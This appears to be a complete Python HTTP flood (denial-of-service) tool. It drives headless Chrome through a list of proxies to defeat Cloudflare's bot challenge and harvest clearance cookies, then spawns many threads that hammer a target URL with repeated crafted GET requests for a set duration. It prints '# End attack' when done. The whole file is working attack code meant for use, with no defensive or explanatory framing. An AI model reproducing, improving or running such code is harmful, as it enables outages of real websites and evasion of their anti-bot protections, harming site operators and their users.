# -*- coding: utf-8 -*-
import threading, datetime, time, sys, socket, socks, ssl, requests, random
import undetected_chromedriver as webdriver
from selenium.webdriver.common.by import By
from urllib.parse import urlparse
import psutil
from colorama import Fore, init
from sys import stdout
init(convert=True)

config = {}
DELAY = False
DELAY_TIME = 0.1
SKIP = False
SUPERSKIP = False


def get_cookie(proxy, url, thread_num, ua):
    global failed, success
    px = proxy.split('.')
    hidepx = px[0]+".***."+px[2]+".***:"+px[3].split(':')[1]
    r = ""
    Bypass = True
    #try:
    #    r = requests.get(url, proxies={'http': 'http://'+proxy,'https': 'http://'+proxy},timeout=30).text
    #except:
    #    Bypass = True
    if 'CAPTCHA' in r:
        if SKIP == True:
            failed += 1
            stdout.write("#"+str(thread_num)+" SKIPPED : "+ hidepx + " All/Success/Fail["+str(total)+"/"+str(success)+"/"+str(failed)+"]"+'\n')
            return
        stdout.write("#"+str(thread_num)+" Get cookie : "+hidepx+Fore.RESET)
        Bypass = True
    else:
        stdout.write("Not Found")
        pass
    if Bypass == True:
        options = webdriver.ChromeOptions()
        options.add_argument('--proxy-server={0}'.format(proxy))
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-setuid-sandbox')
        options.add_argument('--disable-infobars')
        options.add_argument('--disable-logging')
        options.add_argument('--disable-login-animations')
        options.add_argument('--disable-notifications')
        options.add_argument('--disable-gpu')
        options.add_argument('--incognito')
        options.add_argument('--headless')
        options.add_argument('--lang=ko_KR')
        options.add_argument("--start-maxmized")
        options.add_argument(f'--user-agent={ua}')
        try:
            driver = webdriver.Chrome(options=options)
            driver.get(url)
            wait = 0
            #print(driver.title)
            driver.implicitly_wait(10)
            while 'Please Wait... | Cloudflare' in driver.title or 'Just a moment...' in driver.title or 'Attention Required! | Cloudflare' in driver.title:
                #print(driver.title)
                if wait >= 30:
                    driver.quit()
                    failed += 1
                    stdout.write("#"+str(thread_num)+" Failed : Proxy Connection Error(1)" + " All/Success/Fail["+str(total)+"/"+str(success)+"/"+str(failed)+"]"+'\n')
                    return
                try:
                    driver.find_element(By.XPATH, '//*[@id="cf-norobot-container"]/input').click()
                except:
                    pass
                time.sleep(1)
                wait += 1
                #stdout.write('waiting title...')
            wait = 0
            while len(driver.get_cookies()) == 0:
                if wait >= 30:
                    driver.quit()
                    failed += 1
                    stdout.write("#"+str(thread_num)+" Failed : Proxy Connection Error(3)" + " All/Success/Fail["+str(total)+"/"+str(success)+"/"+str(failed)+"]"+'\n')
                    return
                time.sleep(1)
                wait+=1
                #stdout.write('waiting')
            ck = driver.get_cookies()
            tryy = 0
            for i in ck:
                if i['name'] == 'cf_clearance' or i['name'] == '__cf_bm':
                    cookieJAR = driver.get_cookies()[tryy]
                    #print(cookieJAR)
                    cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                    config[thread_num] = f"{proxy}---{cookie}---{ua}"
                    driver.quit()
                    success += 1
                    stdout.write(Fore.LIGHTGREEN_EX+"#"+str(thread_num)+" Success : "+hidepx+ " All/Success/Fail["+str(total)+"/"+str(success)+"/"+str(failed)+"]"+Fore.RESET+'\n')
                    return
                else:
                    tryy += 1
            driver.quit()
            failed += 1
            stdout.write("#"+str(thread_num)+" Failed : Proxy Connection Error(2)" + " All/Success/Fail["+str(total)+"/"+str(success)+"/"+str(failed)+"]"+'\n')
            return
        except Exception as e:
            failed += 1
            stdout.write("#"+str(thread_num)+" Failed : Session Exception Error" + " All/Success/Fail["+str(total)+"/"+str(success)+"/"+str(failed)+"]"+'\n')
            print(e)
    else:
        #SUPERSKIP = True
        config[thread_num] = f"{proxy}---None---{ua}"
        success += 1
        stdout.write(Fore.LIGHTGREEN_EX+"#"+str(thread_num)+" Proxy Ready : "+hidepx+ " All/Success/Fail["+str(total)+"/"+str(success)+"/"+str(failed)+"]"+Fore.RESET+'\n')

def r(proxy, cookie, url, ua, until):
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    px = proxy.split(":")
    
    thread_count = 0
    while int(thread_count) < int(thr):
        try:
            threading.Thread(target=test, args=(px, cookie, target, ua, until)).start()
            thread_count += 1
        except:
            pass

def test(px, cookie, target, ua, until):
    req =  'GET / HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="101", "Google Chrome";v="101"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: '+ua + '\r\n\r\n\r\n'
    try:
        if target['scheme'] == 'https':
            packet = socks.socksocket()
            packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            packet.set_proxy(socks.HTTP, str(px[0]), int(px[1]))
            packet.connect((str(target['host']), int(target['port'])))
            packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
        else:
            packet = socks.socksocket()
            packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            packet.set_proxy(socks.HTTP, str(px[0]), int(px[1]))
            packet.connect((str(target['host']), int(target['port'])))
    except:
        return
    while (until - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
                time.sleep(0.001*int(interval))
                pass
        except:
            packet.close()
            pass
def kill():
     for proc in psutil.process_iter():
        try:
            if proc.name() == "chrome":
                try:
                    proc.kill()
                except:
                    pass
        except:
            pass

def main():
    global failed, success, total, thr
    failed, success, total, thread_num = 0, 0, 0, 0
    global interval
    url = sys.argv[1]
    until = sys.argv[2]
    thr = sys.argv[3]
    proxypath = sys.argv[4]
    interval = sys.argv[5]
    ua = open('./ua.txt', 'r').read().split('\n')
    for _ in open(proxypath, encoding="utf-8"):
        total += 1
    stdout.write("## Start with "+str(total)+" proxies..."+'\n')
    for line in open(proxypath, encoding="utf-8"):
        line = line.strip()
        thread_num += 1
        threading.Thread(target=get_cookie, args=(line, url, thread_num, random.choice(ua))).start()
        time.sleep(DELAY_TIME)
    while(failed+success!=total):
        time.sleep(1)
    stdout.write("# Get Cookie Thread end"+'\n')
    kill()
    until_time = datetime.datetime.now() + datetime.timedelta(seconds=int(until))
    for num in range(len(config)):
        try:
            proxy = config[num+1].split('---')[0]
            cookie = config[num+1].split('---')[1]
            ua = config[num+1].split('---')[2]
            #stdout.write(f"proxy:{proxy} cookie:{cookie} ua:{ua}")
            thd = threading.Thread(target=r , args=(proxy, cookie, url, ua, until_time))
            thd.start()
        except Exception as e:
            #stdout.write('error')
            #stdout.write(e)
            pass
    time.sleep(int(until))
    stdout.write("# End attack"+'\n')
    sys.exit()

if __name__ == '__main__':
    if len(sys.argv) < 6:
        stdout.write(f"user@some_name:~# python3 {sys.argv[0]} <target> <time> <thread> <proxy> <interval>"+'\n')
        sys.exit()
    main()